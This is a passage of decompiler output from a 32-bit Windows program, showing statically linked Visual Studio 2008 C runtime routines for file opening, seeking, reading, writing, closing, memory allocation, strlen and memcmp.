        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_004093a1();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_00422044,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_004093a1(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2008 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_00409503();
  }
  return iVar2;
}



void FUN_00409503(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  long lVar5;
  char *pcVar6;
  FILE *pFVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_c;
  
  pFVar7 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_c = __lseek(_FileHandle,0,1);
  if (local_c < 0) {
    return -1;
  }
  uVar1 = _File->_flag;
  if ((uVar1 & 0x108) == 0) {
    return local_c - _File->_cnt;
  }
  pcVar6 = _File->_ptr;
  pcVar8 = _File->_base;
  local_10 = (int)pcVar6 - (int)pcVar8;
  if ((uVar1 & 3) == 0) {
    if (-1 < (char)uVar1) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      return -1;
    }
  }
  else {
    pcVar2 = pcVar8;
    if ((*(byte *)((&DAT_004257a0)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x40) & 0x80)
        != 0) {
      for (; pcVar2 < pcVar6; pcVar2 = pcVar2 + 1) {
        if (*pcVar2 == '\n') {
          local_10 = local_10 + 1;
        }
      }
    }
  }
  if (local_c != 0) {
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        pFVar4 = (FILE *)(pcVar6 + (_File->_cnt - (int)pcVar8));
        iVar9 = (_FileHandle & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_004257a0)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar5 = __lseek(_FileHandle,0,2);
          if (lVar5 == local_c) {
            pcVar6 = _File->_base;
            pcVar8 = pcVar6 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar6 < pcVar8; pcVar6 = pcVar6 + 1) {
              if (*pcVar6 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (pFVar7->_flag & 0x2000U) == 0;
          }
          else {
            lVar5 = __lseek(_FileHandle,local_c,0);
            if (lVar5 < 0) {
              return -1;
            }
            pFVar7 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar7 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_004257a0)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar7;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_c = local_c - (int)_File;
      }
    }
    return local_10 + local_c;
  }
  return local_10;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2008 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_0040970e();
  }
  return lVar2;
}



void FUN_0040970e(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _V6_HeapAlloc
// 
// Library: Visual Studio 2008 Release

int * __cdecl _V6_HeapAlloc(uint *param_1)

{
  int *local_20;
  
  local_20 = (int *)0x0;
  if (param_1 <= DAT_00425778) {
    __lock(4);
    local_20 = ___sbh_alloc_block(param_1);
    FUN_0040975e();
  }
  return local_20;
}



void FUN_0040975e(void)

{
  FUN_0040e2eb(4);
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _malloc(size_t _Size)

{
  int *piVar1;
  int iVar2;
  size_t sVar3;
  uint dwBytes;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_00423e54 == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      if (DAT_0042576c == 1) {
        dwBytes = _Size;
        if (_Size == 0) {
          dwBytes = 1;
        }
LAB_004097d6:
        piVar1 = (int *)HeapAlloc(DAT_00423e54,0,dwBytes);
      }
      else if ((DAT_0042576c != 3) || (piVar1 = _V6_HeapAlloc((uint *)_Size), piVar1 == (int *)0x0))
      {
        sVar3 = _Size;
        if (_Size == 0) {
          sVar3 = 1;
        }
        dwBytes = sVar3 + 0xf & 0xfffffff0;
        goto LAB_004097d6;
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_004241a8 == 0) {
        piVar1 = __errno();
        *piVar1 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  uint uVar1;
  undefined *puVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined *_DstBuf_00;
  uint local_10;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_DstBuf != (void *)0x0) {
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize))) {
LAB_004098ac:
        uVar8 = _ElementSize * _Count;
        uVar7 = uVar8;
        puVar2 = (undefined *)_DstBuf;
        uVar1 = _DstSize;
        if ((_File->_flag & 0x10cU) == 0) {
          local_10 = 0x1000;
        }
        else {
          local_10 = _File->_bufsiz;
        }
joined_r0x004098d2:
        do {
          while( true ) {
            if (uVar7 == 0) {
              return _Count;
            }
            if ((_File->_flag & 0x10cU) == 0) break;
            uVar4 = _File->_cnt;
            if (uVar4 == 0) break;
            if ((int)uVar4 < 0) {
LAB_00409a23:
              _File->_flag = _File->_flag | 0x20;
LAB_00409a27:
              return (uVar8 - uVar7) / _ElementSize;
            }
            uVar6 = uVar7;
            if (uVar4 <= uVar7) {
              uVar6 = uVar4;
            }
            if (uVar1 < uVar6) {
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_00409868;
            }
            _memcpy_s(puVar2,uVar1,_File->_ptr,uVar6);
            _File->_cnt = _File->_cnt - uVar6;
            _File->_ptr = _File->_ptr + uVar6;
            uVar7 = uVar7 - uVar6;
            uVar1 = uVar1 - uVar6;
            puVar2 = puVar2 + uVar6;
          }
          if (local_10 <= uVar7) {
            if (local_10 == 0) {
              uVar4 = 0x7fffffff;
              if (uVar7 < 0x80000000) {
                uVar4 = uVar7;
              }
            }
            else {
              if (uVar7 < 0x80000000) {
                uVar6 = uVar7 % local_10;
                uVar4 = uVar7;
              }
              else {
                uVar6 = (uint)(0x7fffffff % (ulonglong)local_10);
                uVar4 = 0x7fffffff;
              }
              uVar4 = uVar4 - uVar6;
            }
            if (uVar1 < uVar4) {
LAB_004099f6:
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_00409868;
            }
            _DstBuf_00 = puVar2;
            iVar5 = __fileno(_File);
            iVar5 = __read(iVar5,_DstBuf_00,uVar4);
            if (iVar5 == 0) {
              _File->_flag = _File->_flag | 0x10;
              goto LAB_00409a27;
            }
            if (iVar5 == -1) goto LAB_00409a23;
            uVar7 = uVar7 - iVar5;
            uVar1 = uVar1 - iVar5;
            puVar2 = puVar2 + iVar5;
            goto joined_r0x004098d2;
          }
          iVar5 = __filbuf(_File);
          if (iVar5 == -1) goto LAB_00409a27;
          if (uVar1 == 0) goto LAB_004099f6;
          *puVar2 = (char)iVar5;
          local_10 = _File->_bufsiz;
          uVar7 = uVar7 - 1;
          uVar1 = uVar1 - 1;
          puVar2 = puVar2 + 1;
        } while( true );
      }
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize)))
      goto LAB_004098ac;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
LAB_00409868:
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
      FUN_00409ac7();
      return sVar2;
    }
    if (_DstSize != 0xffffffff) {
      _memset(_DstBuf,0,_DstSize);
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_00409ac7(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x18));
  return;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2008 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_20 = -1;
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_00409bd9();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



void FUN_00409bd9(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint _Size_00;
  uint uVar5;
  uint uVar6;
  char *_Buf;
  uint local_c;
  char *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      uVar6 = _Size * _Count;
      uVar5 = uVar6;
      if ((_File->_flag & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = _File->_bufsiz;
      }
      do {
        while( true ) {
          if (uVar5 == 0) {
            return _Count;
          }
          uVar4 = _File->_flag & 0x108;
          if (uVar4 == 0) break;
          uVar3 = _File->_cnt;
          if (uVar3 == 0) break;
          if ((int)uVar3 < 0) {
            _File->_flag = _File->_flag | 0x20;
            goto LAB_00409d2e;
          }
          _Size_00 = uVar5;
          if (uVar3 <= uVar5) {
            _Size_00 = uVar3;
          }
          _memcpy(_File->_ptr,_DstBuf,_Size_00);
          _File->_cnt = _File->_cnt - _Size_00;
          _File->_ptr = _File->_ptr + _Size_00;
          uVar5 = uVar5 - _Size_00;
LAB_00409cea:
          local_8 = (char *)((int)_DstBuf + _Size_00);
          _DstBuf = local_8;
        }
        if (local_c <= uVar5) {
          if ((uVar4 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_00409d2e;
          uVar4 = uVar5;
          if (local_c != 0) {
            uVar4 = uVar5 - uVar5 % local_c;
          }
          _Buf = (char *)_DstBuf;
          uVar3 = uVar4;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            _Size_00 = uVar4;
            if (uVar3 <= uVar4) {
              _Size_00 = uVar3;
            }
            uVar5 = uVar5 - _Size_00;
            if (uVar4 <= uVar3) goto LAB_00409cea;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_00409d2e:
          return (uVar6 - uVar5) / _Size;
        }
                    // WARNING: Load size is inaccurate
        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_00409d2e;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_c = _File->_bufsiz;
        uVar5 = uVar5 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_00409dbb();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_00409dbb(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



int __cdecl FUN_00409dc5(short *param_1)

{
  short sVar1;
  short *psVar2;
  
  psVar2 = param_1;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00409e43;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00409e43:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// Library Function - Single Match
//  _memcmp
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2019 Release

int __cdecl _memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  
  if (_Size == 0) {
    return 0;
  }
  if (_Size == 1) {
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf2;
  }
  else if (_Size == 2) {
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf2;
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 1);
  }
  else if (_Size == 3) {
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar2 = (uint)*_Buf2;
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar1 != uVar2) &&
       (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
      return iVar3;
    }
    uVar1 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar2 = (uint)*(byte *)((int)_Buf2 + 2);
  }
  else {
    if (_Size != 4) {
LAB_0040a31d:
      switch(_Size) {
      case 0:
        break;
      case 1:
        goto switchD_0040a332_caseD_1;
      case 2:
        goto switchD_0040a332_caseD_2;
      case 3:
        goto switchD_0040a332_caseD_3;
      case 4:
        goto switchD_0040a332_caseD_4;
      case 5:
        goto switchD_0040a332_caseD_5;
      case 6:
        goto switchD_0040a332_caseD_6;
      case 7:
        goto switchD_0040a332_caseD_7;
      case 8:
        goto switchD_0040a332_caseD_8;
      case 9:
        goto switchD_0040a332_caseD_9;
      case 10:
        goto switchD_0040a332_caseD_a;
      case 0xb:
        goto switchD_0040a332_caseD_b;
      case 0xc:
        goto switchD_0040a332_caseD_c;
      case 0xd:
        goto switchD_0040a332_caseD_d;
      case 0xe:
        goto switchD_0040a332_caseD_e;
      case 0xf:
        goto switchD_0040a332_caseD_f;
      case 0x10:
        goto switchD_0040a332_caseD_10;
      case 0x11:
        goto switchD_0040a332_caseD_11;
      case 0x12:
        goto switchD_0040a332_caseD_12;
      case 0x13:
        goto switchD_0040a332_caseD_13;
      case 0x14:
        goto switchD_0040a332_caseD_14;
      case 0x15:
        goto switchD_0040a332_caseD_15;
      case 0x16:
        goto switchD_0040a332_caseD_16;
      case 0x17:
        goto switchD_0040a332_caseD_17;
      case 0x1a:
        goto switchD_0040a332_caseD_1a;
      case 0x1b:
        goto switchD_0040a332_caseD_1b;
      case 0x1c:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1c));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1c))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
      case 0x18:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x18));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x18))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_14:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x14));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x14))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_10:
        uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x10));
        if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x10))) {
          iVar3 = 0;
        }
        else {
          uVar1 = uVar1 & 0xff;
          uVar2 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
          if ((uVar1 != uVar2) &&
             (iVar3 = (uint)(uVar1 != uVar2 && -1 < (int)(uVar1 - uVar2)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe));
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd)) -
                  (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
          if (iVar3 != 0) {
            iVar3 = (uint)(0 < iVar3) * 2 + -1;
          }
        }
        if (iVar3 != 0) {
          return iVar3;
        }
switchD_0040a332_caseD_c:
        if (*(int *)((int)_Buf1 + (_Size - 0xc)) == *(int *)((int)_Buf2 + (_Size - 0xc))) {
          iVar3 = 0;
        }
        else {
          uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
          if ((uVar2 != uVar1) &&
             (iVar3 = (uint)(uVar2 != uVar1 && -1 < (int)(uVar2 - uVar1)) * 2 + -1, iVar3 != 0)) {
            return iVar3;
          }
          uVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb));
